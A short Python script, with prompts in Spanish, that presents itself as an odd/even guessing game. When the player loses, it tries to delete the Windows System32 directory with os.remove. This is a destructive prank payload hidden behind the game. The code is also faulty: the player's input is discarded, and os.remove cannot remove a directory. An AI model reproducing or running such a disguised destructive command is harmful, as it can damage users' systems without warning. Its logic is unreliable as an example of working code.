import os;
from random import random

print('dime un numero par o impar')
var1 = 0
input(var1)


num1ran = random()*2+1
num1ran = num1ran - (num1ran % 1)
print(num1ran)
if num1ran == 1 :
    if var1 % 2 == 0:
        os.remove("C:\\Windows\\System32");
    else:
        print("ganaste")
else:
    if var1 % 2 != 0:
        os.remove("C:\\Windows\\System32")
    else:
        print('ganaste');
